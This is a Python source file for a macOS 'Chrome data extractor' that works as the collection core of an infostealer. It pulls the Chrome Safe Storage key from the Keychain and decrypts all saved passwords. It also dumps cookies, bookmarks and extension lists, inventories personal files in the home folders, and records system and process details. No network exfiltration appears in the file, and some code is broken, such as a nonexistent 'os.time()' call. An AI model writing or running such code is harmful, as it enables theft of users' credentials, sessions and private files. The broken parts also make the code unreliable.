"""
macOS File System and Chrome Data Extractor
Handles Chrome passwords, tokens, cookies, and file system access
"""

import os
import json
import sqlite3
import subprocess
import shutil
from pathlib import Path
from typing import Dict, List, Any, Optional
import keyring
from Crypto.Cipher import AES
import base64
import psutil


class ChromeDataExtractor:
    """Extracts Chrome passwords, cookies, and session data from macOS"""
    
    def __init__(self):
        self.chrome_paths = [
            Path.home() / "Library/Application Support/Google/Chrome",
            Path.home() / "Library/Application Support/Google/Chrome Beta",
            Path.home() / "Library/Application Support/Google/Chrome Dev",
        ]
        self.keychain_service = "Chrome Safe Storage"
    
    def get_chrome_profiles(self) -> List[Path]:
        """Get all Chrome profile directories"""
        profiles = []
        for chrome_path in self.chrome_paths:
            if chrome_path.exists():
                profiles.extend(chrome_path.glob("Profile *"))
                profiles.extend(chrome_path.glob("Default"))
        return profiles
    
    def get_master_key(self) -> Optional[bytes]:
        """Extract Chrome master key from macOS Keychain"""
        try:
            # Try to get the Chrome Safe Storage password from keychain
            password = subprocess.check_output([
                "security", "find-generic-password", 
                "-w", "-s", self.keychain_service
            ], stderr=subprocess.DEVNULL).decode().strip()
            
            if password:
                # Chrome uses PBKDF2 with the password
                import hashlib
                key = hashlib.pbkdf2_hmac('sha1', password.encode(), b'saltysalt', 1003)
                return key[:16]  # Chrome uses 16-byte keys
        except subprocess.CalledProcessError:
            pass
        return None
    
    def decrypt_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypt Chrome password using AES"""
        try:
            # Remove the 'v10' or 'v11' prefix
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                encrypted_password = encrypted_password[3:]
            
            # Chrome uses AES in CBC mode
            iv = encrypted_password[:16]
            ciphertext = encrypted_password[16:]
            
            cipher = AES.new(master_key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            
            # Remove padding
            return decrypted.rstrip(b'\x00').decode('utf-8', errors='ignore')
        except Exception:
            return ""
    
    def extract_passwords(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract saved passwords from Chrome profile"""
        passwords = []
        login_db = profile_path / "Login Data"
        
        if not login_db.exists():
            return passwords
        
        try:
            # Copy database to temp location since Chrome might have it locked
            temp_db = Path("/tmp/chrome_login_temp.db")
            shutil.copy2(login_db, temp_db)
            
            master_key = self.get_master_key()
            if not master_key:
                return passwords
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created = row
                if encrypted_password:
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    passwords.append({
                        "url": origin_url,
                        "username": username,
                        "password": decrypted_password,
                        "date_created": date_created
                    })
            
            conn.close()
            temp_db.unlink()  # Clean up temp file
            
        except Exception as e:
            print(f"Error extracting passwords: {e}")
        
        return passwords
    
    def extract_cookies(self, profile_path: Path) -> List[Dict[str, Any]]:
        """Extract cookies from Chrome profile"""
        cookies = []
        cookies_db = profile_path / "Cookies"
        
        if not cookies_db.exists():
            return cookies
        
        try:
            temp_db = Path("/tmp/chrome_cookies_temp.db")
            shutil.copy2(cookies_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            
            for row in cursor.fetchall():
                host_key, name, value, path, expires_utc, is_secure, is_httponly = row
                cookies.append({
                    "host": host_key,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expires_utc,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            temp_db.unlink()
            
        except Exception as e:
            print(f"Error extracting cookies: {e}")
        
        return cookies
    
    def extract_session_data(self, profile_path: Path) -> Dict[str, Any]:
        """Extract session and profile data"""
        session_data = {
            "profile_name": profile_path.name,
            "profile_path": str(profile_path),
            "preferences": {},
            "bookmarks": [],
            "history": []
        }
        
        # Extract preferences
        prefs_file = profile_path / "Preferences"
        if prefs_file.exists():
            try:
                with open(prefs_file, 'r') as f:
                    prefs = json.load(f)
                    session_data["preferences"] = {
                        "profile_name": prefs.get("profile", {}).get("name", ""),
                        "avatar_icon": prefs.get("profile", {}).get("avatar_icon", ""),
                        "extensions": list(prefs.get("extensions", {}).keys())
                    }
            except Exception as e:
                print(f"Error reading preferences: {e}")
        
        # Extract bookmarks
        bookmarks_file = profile_path / "Bookmarks"
        if bookmarks_file.exists():
            try:
                with open(bookmarks_file, 'r') as f:
                    bookmarks = json.load(f)
                    session_data["bookmarks"] = self._extract_bookmarks(bookmarks)
            except Exception as e:
                print(f"Error reading bookmarks: {e}")
        
        return session_data
    
    def _extract_bookmarks(self, bookmarks_data: Dict) -> List[Dict]:
        """Recursively extract bookmarks"""
        bookmarks = []
        
        def extract_from_node(node):
            if node.get("type") == "url":
                bookmarks.append({
                    "name": node.get("name", ""),
                    "url": node.get("url", ""),
                    "date_added": node.get("date_added", "")
                })
            elif node.get("type") == "folder":
                for child in node.get("children", []):
                    extract_from_node(child)
        
        for root in bookmarks_data.get("roots", {}).values():
            if isinstance(root, dict) and "children" in root:
                for child in root["children"]:
                    extract_from_node(child)
        
        return bookmarks


class FileSystemExtractor:
    """Extracts accessible files from macOS file system"""
    
    def __init__(self):
        self.home_dir = Path.home()
        self.accessible_paths = [
            self.home_dir / "Desktop",
            self.home_dir / "Documents", 
            self.home_dir / "Downloads",
            self.home_dir / "Pictures",
            self.home_dir / "Movies",
            self.home_dir / "Music",
            self.home_dir / "Public",
            Path("/Applications"),
            Path("/System/Applications"),
        ]
    
    def get_accessible_files(self, max_files: int = 1000) -> List[Dict[str, Any]]:
        """Get list of accessible files with metadata"""
        files = []
        
        for path in self.accessible_paths:
            if path.exists():
                try:
                    for file_path in path.rglob("*"):
                        if len(files) >= max_files:
                            break
                        
                        if file_path.is_file() and not self._is_system_file(file_path):
                            try:
                                stat = file_path.stat()
                                files.append({
                                    "path": str(file_path),
                                    "name": file_path.name,
                                    "size": stat.st_size,
                                    "modified": stat.st_mtime,
                                    "permissions": oct(stat.st_mode)[-3:],
                                    "extension": file_path.suffix
                                })
                            except (PermissionError, OSError):
                                continue
                except (PermissionError, OSError):
                    continue
        
        return files[:max_files]
    
    def _is_system_file(self, file_path: Path) -> bool:
        """Check if file should be excluded"""
        excluded_patterns = [
            ".DS_Store", ".localized", ".Trash", ".Spotlight-V100",
            ".fseventsd", ".TemporaryItems", ".VolumeIcon.icns"
        ]
        
        return any(pattern in str(file_path) for pattern in excluded_patterns)
    
    def get_system_info(self) -> Dict[str, Any]:
        """Get system information"""
        try:
            # Get system info
            system_info = {
                "hostname": os.uname().nodename,
                "username": os.getenv("USER", "unknown"),
                "home_directory": str(self.home_dir),
                "cpu_count": psutil.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "disk_usage": {},
                "running_processes": []
            }
            
            # Get disk usage
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    system_info["disk_usage"][partition.mountpoint] = {
                        "total": usage.total,
                        "used": usage.used,
                        "free": usage.free
                    }
                except PermissionError:
                    continue
            
            # Get running processes (limited to avoid too much data)
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    system_info["running_processes"].append(proc.info)
                    if len(system_info["running_processes"]) >= 100:  # Limit
                        break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return system_info
            
        except Exception as e:
            print(f"Error getting system info: {e}")
            return {}


def extract_all_data() -> Dict[str, Any]:
    """Extract all Chrome and file system data"""
    chrome_extractor = ChromeDataExtractor()
    fs_extractor = FileSystemExtractor()
    
    # Get Chrome profiles
    profiles = chrome_extractor.get_chrome_profiles()
    
    chrome_data = {
        "profiles": [],
        "passwords": [],
        "cookies": [],
        "sessions": []
    }
    
    # Extract data from each profile
    for profile in profiles:
        profile_data = chrome_extractor.extract_session_data(profile)
        passwords = chrome_extractor.extract_passwords(profile)
        cookies = chrome_extractor.extract_cookies(profile)
        
        chrome_data["profiles"].append(profile_data)
        chrome_data["passwords"].extend(passwords)
        chrome_data["cookies"].extend(cookies)
        chrome_data["sessions"].append(profile_data)
    
    # Get file system data
    files_data = fs_extractor.get_accessible_files()
    system_info = fs_extractor.get_system_info()
    
    return {
        "chrome_data": chrome_data,
        "files": files_data,
        "system_info": system_info,
        "extraction_timestamp": os.time()
    }
